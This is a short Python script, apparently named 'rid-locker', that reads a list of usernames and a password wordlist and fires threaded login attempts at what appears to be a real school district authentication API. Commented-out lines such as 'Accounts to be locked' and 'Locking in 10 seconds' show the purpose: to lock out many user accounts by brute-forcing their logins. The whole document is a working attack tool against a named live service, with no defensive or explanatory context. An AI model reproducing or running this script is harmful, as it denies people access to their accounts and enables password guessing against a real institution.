 #!/usr/bin/env python3

import requests
import rid_api
from threading import Thread
from itertools import islice
import time

name_file = open("/mnt/data/rid-locker/account_list")
name_list = name_file.read().splitlines()

thread_count = 100
words_per_thread = 100

api_url = "https://portal.id.cps.edu/api/rest/authn"
wordlist = '/mnt/data/rid-locker/all_in_one_w'

#print("Accounts to be locked:")

#for username in name_list:
#    print(username)

#print("Locking in 10 seconds, press Ctrl+C to cancel")
#time.sleep(10)
#print("Initializing threads...")
#time.sleep(2)

for username in name_list:
    with open(wordlist) as f:
        for i in range(0,thread_count):
            next_n_lines = list(islice(f, words_per_thread))
            if not next_n_lines:
                break
            Thread(target=rid_api.test_list, args=(requests.session(), api_url, username, next_n_lines)).start()
    time.sleep(60)